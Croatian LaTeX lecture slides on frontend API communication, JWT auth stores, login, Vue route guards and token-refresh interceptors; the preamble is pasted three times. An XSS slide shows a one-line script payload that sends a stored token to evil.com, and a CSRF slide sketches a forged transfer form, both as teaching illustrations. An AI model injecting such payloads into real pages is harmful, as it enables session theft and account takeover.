% !TeX program = lualatex
% !TeX root = predavanje08.tex
% ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: \input{../common/preamble.tex}
% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\setsansfont{Latin Modern Sans}    % sans-serif font
\setmonofont{Latin Modern Mono}    % monospace font za kod
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{lmodern}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}

% ---------- Autor i logo ----------
\author{mag.ing. Josip Torić (SIT UNIZD)}
\titlegraphic{\includegraphics[height=2.5cm]{../common/SIT_logo_tekst1.pdf}}

% ---------- Listings ----------
\definecolor{codebg}{RGB}{248,248,248}
\definecolor{codeframeclr}{RGB}{220,220,220}
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  rulecolor=\color{codeframeclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible
}

% ---------- Helper macros ----------
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\setsansfont{Latin Modern Sans}    % sans-serif font
\setmonofont{Latin Modern Mono}    % monospace font za kod
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{lmodern}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}

% ---------- Autor i logo ----------
\author{mag.ing. Josip Torić (SIT UNIZD)}
\titlegraphic{\includegraphics[height=2.5cm]{../common/SIT_logo_tekst1.pdf}}

% ---------- Listings ----------
\definecolor{codebg}{RGB}{248,248,248}
\definecolor{codeframeclr}{RGB}{220,220,220}
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  rulecolor=\color{codeframeclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible
}

% ---------- Helper macros ----------
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\setsansfont{Latin Modern Sans}    % sans-serif font
\setmonofont{Latin Modern Mono}    % monospace font za kod
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{lmodern}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}

% ---------- Autor i logo ----------
\author{mag.ing. Josip Torić (SIT UNIZD)}
\titlegraphic{\includegraphics[height=2.5cm]{../common/SIT_logo_tekst1.pdf}}

% ---------- Listings ----------
\definecolor{codebg}{RGB}{248,248,248}
\definecolor{codeframeclr}{RGB}{220,220,220}
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  rulecolor=\color{codeframeclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible
}

% ---------- Helper macros ----------
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}


\title[Programiranje za web]{Programiranje za web - Predavanje 8 \\ API komunikacija, auth flow i route guardovi}
\date{30.11.2026.}

\begin{document}

\frame{\titlepage}

% ------------------------------------------------------------
\begin{frame}{Plan predavanja}
\begin{enumerate}
  \item HTTP komunikacija iz frontenda (Axios)
  \item API client wrapper s base URL i interceptorima
  \item Auth store: login, token storage, refresh
  \item Login stranica
  \item Route guardovi po roli
  \item Globalni error handling
  \item Commitovi za ovo predavanje
\end{enumerate}

\vspace{0.6em}
Na kraju predavanja: korisnik se može prijaviti, frontend pamti token, zaštićene rute traže autentikaciju.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Ishodi učenja}
Nakon ovog predavanja student može:
\begin{itemize}
  \item konfigurirati Axios instance s base URL-om i interceptorima
  \item implementirati auth store koji upravlja JWT tokenima
  \item objasniti zašto se access token drži u memoriji, a refresh u httpOnly cookieu ili localStorageu
  \item implementirati route guard koji provjerava autentikaciju i rolu
  \item hendlati 401 response automatskim refreshom tokena
\end{itemize}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Kako frontend komunicira s backendom}
Frontend ne pristupa bazi direktno. Sva komunikacija ide kroz HTTP:

\vspace{0.4em}
\begin{center}
\texttt{Vue komponenta $\rightarrow$ API client $\rightarrow$ HTTP $\rightarrow$ FastAPI $\rightarrow$ PostgreSQL}
\end{center}

\vspace{0.6em}
\begin{tabular}{@{}lll@{}}
  \toprule
  \textbf{Akcija u UI-ju} & \textbf{HTTP metoda} & \textbf{Endpoint} \\
  \midrule
  Prijava korisnika & POST & \codefile{/auth/login} \\
  Dohvat natjecatelja & GET & \codefile{/clubs/\{id\}/lifters} \\
  Dodavanje natjecatelja & POST & \codefile{/clubs/\{id\}/lifters} \\
  Promjena kategorije & PATCH & \codefile{/competitions/\{id\}/registrations/\{id\}} \\
  \bottomrule
\end{tabular}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{HTTP iz browsera: Fetch vs Axios}
\begin{columns}[T]
\column{0.48\textwidth}
\textbf{Fetch API (native)}
\begin{itemize}
  \item Ugrađen u browser - nema dependencija
  \item Ne baca exception na 4xx/5xx (samo network error)
  \item Ručno parsiranje JSON-a (\texttt{.json()})
  \item Nema interceptore
\end{itemize}

\column{0.48\textwidth}
\textbf{Axios}
\begin{itemize}
  \item Automatski JSON parse/serialize
  \item Baca exception na 4xx/5xx
  \item Request i response interceptori
  \item Konfigurabilni timeout
  \item Širi browser support
\end{itemize}
\end{columns}

\vspace{0.6em}
Za projekt s auth flowom, interceptorima i error handlingom, Axios štedi dosta boilerplate koda. Za jednostavan GET request, Fetch je sasvim dovoljan.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Što su interceptori}
Interceptori su \textbf{middleware} za HTTP requestove i responseove. Svaki request/response prolazi kroz njih prije nego što dođe do komponente.

\vspace{0.6em}
\begin{center}
\texttt{Komponenta $\rightarrow$ Request interceptor $\rightarrow$ Server $\rightarrow$ Response interceptor $\rightarrow$ Komponenta}
\end{center}

\vspace{0.6em}
\begin{tabular}{@{}lp{8cm}@{}}
  \toprule
  \textbf{Tip} & \textbf{Upotreba} \\
  \midrule
  Request interceptor & Dodaj Authorization header na svaki request \\
  Response interceptor & Uhvati 401, napravi token refresh, ponovi request \\
  Error interceptor & Centralizirano logiranje grešaka \\
  \bottomrule
\end{tabular}

\vspace{0.4em}
Bez interceptora biste morali ručno dodavati token i hendlati 401 u svakoj komponenti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Async/await na frontendu}
API pozivi su asinkroni - ne blokiraju UI dok čekamo odgovor servera.

\vspace{0.4em}
\begin{enumerate}
  \item Korisnik klikne gumb $\rightarrow$ pokrene se async funkcija
  \item Postavimo \texttt{loading = true} $\rightarrow$ UI prikaže spinner
  \item \texttt{await api.get(...)} $\rightarrow$ čekamo odgovor (UI ostaje responsivan)
  \item Odgovor stigne $\rightarrow$ ažuriramo podatke $\rightarrow$ \texttt{loading = false}
  \item Ako dođe do greške $\rightarrow$ \texttt{catch} blok prikaže poruku
\end{enumerate}

\vspace{0.6em}
\texttt{async/await} je sintaktički šećer nad Promiseima. Čini asinkroni kod čitljivim kao sinkroni, ali ne blokira main thread.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{CORS: zašto browser blokira, a Postman ne}
Browser primjenjuje \textbf{Same-Origin Policy} - JavaScript može slati requestove samo na isti origin s kojeg je stranica učitana.

\vspace{0.4em}
\begin{tabular}{@{}ll@{}}
  \toprule
  \textbf{Alat} & \textbf{Blokira cross-origin?} \\
  \midrule
  Browser (Chrome, Firefox) & Da - zaštita korisnika \\
  Postman / curl & Ne - nema origin koncept \\
  Backend-to-backend & Ne - server nema origin policy \\
  \bottomrule
\end{tabular}

\vspace{0.6em}
Ovo je \textbf{sigurnosna zaštita} za krajnjeg korisnika. Bez nje, maliciozna stranica bi mogla slati requestove na API vaše banke koristeći vaše cookieje. CORS je mehanizam kojim backend eksplicitno dopušta iznimke.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{CORS u praksi: prvi request će vam pasti}
Vite dev server je na \texttt{:5173}, FastAPI na \texttt{:8000} - različiti origini. Prvi Axios poziv završava s \enquote{blocked by CORS policy} u konzoli dok backend ne dopusti vaš origin:

\begin{lstlisting}[language=python]
# app/main.py (backend!)
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
\end{lstlisting}

\vspace{0.4em}
Ovo je dev konfiguracija - dovoljna do kraja semestra. Produkcijsku verziju s env varijablom i preflight detaljima radimo u Predavanju 12. Zapamtite simptom: frontend \enquote{ne radi}, a greška je na backendu.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Axios: API client wrapper}
\begin{lstlisting}[language=typescript]
// src/api/client.ts
import axios, { type AxiosError,
  type InternalAxiosRequestConfig } from 'axios'

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || 'http://localhost:8000',
  headers: { 'Content-Type': 'application/json' },
})

// Interceptor: dodaje token na svaki request
api.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    const token = localStorage.getItem('access_token')
    if (token) {
      config.headers.Authorization = `Bearer ${token}`
    }
    return config
  })

export default api
\end{lstlisting}

\vspace{0.4em}
\texttt{baseURL} se čita iz env varijable - drugačiji za dev i produkciju.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{API pozivi: primjeri}
\begin{lstlisting}[language=typescript]
// src/api/auth.ts
import api from './client'

export interface LoginResponse {
  access_token: string; refresh_token: string
}

export async function login(username: string, password: string) {
  const { data } = await api.post<LoginResponse>('/auth/login', {
    username, password,
  })
  return data
}

export async function getMe() {
  const { data } = await api.get('/auth/me')
  return data
}

// src/api/lifters.ts
export async function getLifters(clubId: number) {
  const { data } = await api.get(`/clubs/${clubId}/lifters`)
  return data
}
\end{lstlisting}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Token storage: opcije}
\begin{tabular}{@{}lp{4.5cm}p{4.5cm}@{}}
  \toprule
  & \textbf{localStorage} & \textbf{Memorija (ref/store)} \\
  \midrule
  Persistencija & Ostaje nakon refresh/zatvaranja & Gubi se na refresh \\
  XSS ranjivost & Da - JS može čitati & Da - ali teže iskoristivo \\
  Jednostavnost & Jednostavno & Treba refresh token flow \\
  \bottomrule
\end{tabular}

\vspace{0.6em}
Za ovaj kolegij koristimo \textbf{localStorage} jer je jednostavniji. U produkcijskim aplikacijama razmotrite httpOnly cookie za refresh token.

\vspace{0.4em}
Access token ima kratki životni vijek (15 min) pa čak i ako je ukraden, šteta je ograničena. Refresh token služi za tiho obnavljanje.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{XSS napad: kako krade token}
XSS (Cross-Site Scripting) - napadač ubaci JavaScript u stranicu koji se izvršava u kontekstu korisnika.

\vspace{0.4em}
\begin{enumerate}
  \item Napadač pronađe input koji se renderira bez escapanja
  \item Ubaci: \texttt{<script>fetch('https://evil.com?t='+} \\ \texttt{localStorage.getItem('token'))</script>}
  \item Kad žrtva posjeti stranicu, skripta se izvrši u njezinu browseru
  \item Token je poslan napadaču - napadač se može prijaviti kao žrtva
\end{enumerate}

\vspace{0.6em}
Vue automatski escapa template izraze (\texttt{\{\{...\}\}}) što štiti od većine XSS-a. Opasnost je \texttt{v-html} direktiva koja renderira sirovi HTML - koristiti samo za trusted sadržaj.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{CSRF napad i SameSite zaštita}
CSRF (Cross-Site Request Forgery) - napadač natjera korisnikov browser da pošalje request na drugi site koristeći postojeći cookie.

\vspace{0.4em}
\begin{enumerate}
  \item Korisnik je prijavljen na \texttt{bank.com} (ima session cookie)
  \item Posjeti \texttt{evil.com} koja ima \texttt{<form action="bank.com/transfer">}
  \item Browser automatski pošalje cookie s requestom
  \item Banka izvrši transfer jer je cookie validan
\end{enumerate}

\vspace{0.6em}
Zaštita: \texttt{SameSite=Lax} ili \texttt{Strict} na cookieju sprečava slanje cookieja s cross-origin requestova. Mi koristimo \texttt{Authorization} header umjesto cookieja za access token - CSRF nije primjenjiv.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Defense in depth za auth}
Sigurnost ne ovisi o jednom mehanizmu. Kombiniramo više slojeva:

\vspace{0.4em}
\begin{tabular}{@{}lp{8cm}@{}}
  \toprule
  \textbf{Sloj} & \textbf{Što štiti} \\
  \midrule
  Kratki access token (15 min) & Ograničava štetu ako je ukraden \\
  Refresh token (dugotrajan) & Omogućava sesiju bez ponovnog logina \\
  CORS & Sprečava requestove s neautoriziranih origina \\
  HTTPS & Sprečava presretanje tokena u transportu \\
  Input escaping (Vue) & Sprečava XSS koji bi ukrao token \\
  \bottomrule
\end{tabular}

\vspace{0.6em}
Nijedan od ovih mehanizama sam nije dovoljan. Zajedno čine sustav otpornim na najčešće napade.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Auth store (Pinia)}
\begin{lstlisting}[language=typescript]
// src/stores/auth.ts
import { defineStore } from 'pinia'
import { ref, computed } from 'vue'
import { login as apiLogin, getMe } from '@/api/auth'

interface User { id: number; username: string;
  role: 'admin' | 'club'; club_id: number | null }

export const useAuthStore = defineStore('auth', () => {
  const user = ref<User | null>(null)
  const token =
    ref<string | null>(localStorage.getItem('access_token'))

  const isAuthenticated = computed(() => !!token.value)
  const isAdmin = computed(() => user.value?.role === 'admin')

  async function login(username: string, password: string) {
    const data = await apiLogin(username, password)
    token.value = data.access_token
    localStorage.setItem('access_token', data.access_token)
    localStorage.setItem('refresh_token', data.refresh_token)
    user.value = await getMe()
  }

  function logout() {
    token.value = null
    user.value = null
    localStorage.removeItem('access_token')
    localStorage.removeItem('refresh_token')
  }

  return { user, token, isAuthenticated, isAdmin, login, logout }
})
\end{lstlisting}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Login stranica}
\begin{lstlisting}[language=html]
<script setup lang="ts">
import { ref } from 'vue'
import { useRouter } from 'vue-router'
import { useAuthStore } from '@/stores/auth'

const auth = useAuthStore()
const router = useRouter()
const username = ref('')
const password = ref('')
const error = ref('')

async function handleLogin() {
  try {
    error.value = ''
    await auth.login(username.value, password.value)
    router.replace('/')
  } catch (e) {
    error.value = 'Pogresan username ili lozinka'
  }
}
</script>
\end{lstlisting}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Login stranica: template}
\begin{lstlisting}[language=html]
<template>
  <div class="login-page">
    <h1>Prijava</h1>
    <form @submit.prevent="handleLogin">
      <div>
        <label>Username</label>
        <input v-model="username" required />
      </div>
      <div>
        <label>Lozinka</label>
        <input v-model="password" type="password" required />
      </div>
      <p v-if="error" class="error">{{ error }}</p>
      <button type="submit">Prijavi se</button>
    </form>
  </div>
</template>
\end{lstlisting}

\vspace{0.4em}
\texttt{@submit.prevent} sprečava defaultno ponašanje forme (page reload). \texttt{v-model} dvosmjerno povezuje input s \texttt{ref()}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Route guard: zaštita ruta}
\begin{lstlisting}[language=typescript]
// src/router/index.ts
router.beforeEach((to, from) => {
  const auth = useAuthStore()

  // Javne rute - ne trebaju auth
  if (to.name === 'login') return true

  // Nije prijavljen - redirect na login
  if (!auth.isAuthenticated) {
    return { name: 'login' }
  }

  // Admin rute - provjera role
  if (to.meta.requiresAdmin && !auth.isAdmin) {
    return { name: 'dashboard' }
  }

  return true
})
\end{lstlisting}

\vspace{0.4em}
\texttt{beforeEach} se poziva prije svake navigacije. Ako vrati objekt s \texttt{name}, korisnik je preusmjeren.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Meta polja na rutama}
\begin{lstlisting}[language=typescript]
const routes = [
  { path: '/login', name: 'login', component: LoginView },
  {
    path: '/',
    name: 'dashboard',
    component: DashboardView,
    // nema meta - samo treba auth (guard provjerava)
  },
  {
    path: '/admin',
    component: AdminLayout,
    meta: { requiresAdmin: true },
    children: [
      { path: 'clubs', component: AdminClubsView },
      { path: 'competitions', component: AdminCompetitionsView },
    ],
  },
]
\end{lstlisting}

\vspace{0.4em}
\texttt{meta} polja su custom podaci na ruti. Guard ih čita i odlučuje smije li korisnik pristupiti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Navigation guards: tipovi}
Vue Router ima tri razine navigation guardova:

\vspace{0.4em}
\begin{tabular}{@{}lp{4cm}p{5cm}@{}}
  \toprule
  \textbf{Tip} & \textbf{Gdje se definira} & \textbf{Kad koristiti} \\
  \midrule
  Global & \texttt{router.beforeEach()} & Auth provjera za cijelu aplikaciju \\
  Per-route & \texttt{beforeEnter} na ruti & Specifična pravila za jednu rutu \\
  In-component & \texttt{onBeforeRouteLeave()} & \enquote{Imate nespremljene promjene} dijalog \\
  \bottomrule
\end{tabular}

\vspace{0.6em}
Mi koristimo globalni guard za auth jer svaka ruta osim logina zahtijeva prijavu. Per-route guard bismo koristili za npr. admin-only stranicu s posebnom logikom.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Frontend guard vs backend zaštita}
Frontend guard je \textbf{UX poboljšanje}, ne sigurnosna zaštita.

\vspace{0.6em}
\begin{columns}[T]
\column{0.48\textwidth}
\textbf{Frontend guard}
\begin{itemize}
  \item Sprečava navigaciju na zabranjenu rutu
  \item Korisnik ne vidi stranicu
  \item Može se zaobići (DevTools, direktan API poziv)
  \item Služi za bolji UX
\end{itemize}

\column{0.48\textwidth}
\textbf{Backend zaštita}
\begin{itemize}
  \item Provjerava token na svakom requestu
  \item Vraća 401/403 ako nema pristupa
  \item Ne može se zaobići
  \item Autoritet za sigurnost
\end{itemize}
\end{columns}

\vspace{0.6em}
Oboje su potrebni. Frontend guard sprečava konfuziju, backend sprečava zloupotrebu.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Auth stanje pri refreshu stranice}
Problem: kad korisnik refresha stranicu, Pinia store se resetira na početne vrijednosti.

\vspace{0.6em}
\begin{enumerate}
  \item Korisnik refresha stranicu $\rightarrow$ Pinia state = prazan
  \item Guard vidi \texttt{isAuthenticated = false} $\rightarrow$ redirect na login
  \item Ali token još postoji u localStorage!
\end{enumerate}

\vspace{0.6em}
Rješenje: pri startu aplikacije provjerimo localStorage i pozovemo \texttt{/auth/me}:
\begin{enumerate}
  \item Čitamo token iz localStorage
  \item Ako postoji - pozovemo \texttt{GET /auth/me}
  \item Ako uspije - popunimo store s user podacima
  \item Ako ne uspije (token istekao) - brišemo localStorage, redirect na login
\end{enumerate}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{401 interceptor: automatski refresh}
\begin{lstlisting}[language=typescript]
// src/api/client.ts
api.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const original = error.config as
      InternalAxiosRequestConfig & { _retry?: boolean }
    if (error.response?.status === 401 && !original._retry) {
      original._retry = true
      try {
        const refresh = localStorage.getItem('refresh_token')
        const { data } = await axios.post(
          `${original.baseURL}/auth/refresh`,
          { refresh_token: refresh },
        )
        localStorage.setItem('access_token', data.access_token)
        localStorage.setItem('refresh_token', data.refresh_token)
        original.headers.Authorization =
          `Bearer ${data.access_token}`
        return api(original)
      } catch {
        // refresh failed - logout
        localStorage.clear()
        window.location.href = '/login'
      }
    }
    return Promise.reject(error)
  }
)
\end{lstlisting}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Kako radi 401 interceptor}
\begin{enumerate}
  \item Korisnik radi request s isteklim access tokenom
  \item Backend vraća \textbf{401 Unauthorized}
  \item Interceptor hvata 401, šalje refresh token na \codefile{/auth/refresh}
  \item Ako refresh uspije - sprema nove tokene, ponavlja originalni request
  \item Ako refresh ne uspije (refresh token istekao) - logout i redirect na login
\end{enumerate}

\vspace{0.6em}
Korisnik ne primjećuje refresh - request se automatski ponovi s novim tokenom. Jedino ako je i refresh token istekao, korisnik mora ponovo upisati lozinku.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Globalni error handling}
\begin{lstlisting}[language=typescript]
// src/api/client.ts - dodajemo u response interceptor

// Za sve ostale greske (ne-401)
api.interceptors.response.use(
  (response) => response,
  (error: AxiosError<{ message?: string }>) => {
    const status = error.response?.status
    const data = error.response?.data

    if (status === 403) {
      console.error('Nemate pristup:', data?.message)
    } else if (status === 422) {
      console.error('Validacijska greska:', data)
    } else if (status >= 500) {
      console.error('Server error:', status)
    }

    return Promise.reject(error)
  }
)
\end{lstlisting}

\vspace{0.4em}
Centralizirani error handling - ne trebamo \texttt{try/catch} za iste scenarije u svakoj komponenti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile,shrink=5]{Vue errorHandler: protiv bijelog ekrana}
Interceptor hvata HTTP greške, ali ne i greške u samim komponentama - exception u renderu ruši SPA u prazan ekran. Zadnja linija obrane:

\begin{lstlisting}[language=typescript]
// src/main.ts
const app = createApp(App)

app.config.errorHandler = (err, instance, info) => {
  console.error('Vue error:', err, info)
  // u produkciji: posalji u error tracking (Sentry)
  // i prikazi korisniku genericku poruku
}
\end{lstlisting}

\vspace{0.4em}
\texttt{errorHandler} hvata sve neuhvaćene greške iz komponenti, computeda i watchera. Korisnik umjesto bijelog ekrana dobiva poruku, a vi u konzoli ili error trackingu vidite što je puklo. Isti \enquote{fail gracefully} princip koji backend već ima kroz exception handler.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Auth flow: login}
\begin{enumerate}
  \item Korisnik otvori aplikaciju $\rightarrow$ guard provjeri token
  \item Nema tokena $\rightarrow$ redirect na \codefile{/login}
  \item Korisnik unese credentials $\rightarrow$ POST \codefile{/auth/login}
  \item Backend vrati access + refresh token $\rightarrow$ spremimo u localStorage
  \item Pozovemo \codefile{/auth/me} $\rightarrow$ spremimo user objekt u store
  \item \texttt{router.replace('/')} $\rightarrow$ korisnik vidi dashboard
\end{enumerate}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Auth flow: token lifecycle}
\begin{enumerate}
  \item Svaki request ide s \texttt{Authorization: Bearer <token>}
  \item Token istekne $\rightarrow$ 401 $\rightarrow$ interceptor radi refresh
  \item Refresh istekne $\rightarrow$ logout $\rightarrow$ natrag na login
\end{enumerate}

\vspace{0.6em}
Korisnik ne primjećuje refresh - cijeli ciklus se odvija automatski u interceptoru.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Race condition pri refreshu tokena}
Što ako dva API poziva istovremeno dobiju 401?

\vspace{0.4em}
\begin{enumerate}
  \item Request A dobije 401 $\rightarrow$ šalje refresh
  \item Request B dobije 401 $\rightarrow$ također šalje refresh
  \item Refresh za A uspije - novi token
  \item Refresh za B koristi stari refresh token koji je već iskorišten $\rightarrow$ fail
  \item Korisnik je izbačen bez razloga
\end{enumerate}

\vspace{0.6em}
Rješenje: koristiti \textbf{queue pattern} - prvi 401 pokrene refresh, svi ostali čekaju rezultat tog refresha. Naš interceptor koristi \texttt{\_retry} flag kao jednostavnu verziju ovog patterna.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Centralizirani vs distribuirani error handling}
\begin{columns}[T]
\column{0.48\textwidth}
\textbf{Centralizirani (interceptor)}
\begin{itemize}
  \item 401: automatski refresh
  \item 403: \enquote{Nemate pristup}
  \item 500: \enquote{Server error}
  \item Isti handling za sve requestove
\end{itemize}

\column{0.48\textwidth}
\textbf{Distribuirani (try/catch)}
\begin{itemize}
  \item 409: \enquote{Natjecatelj je već prijavljen}
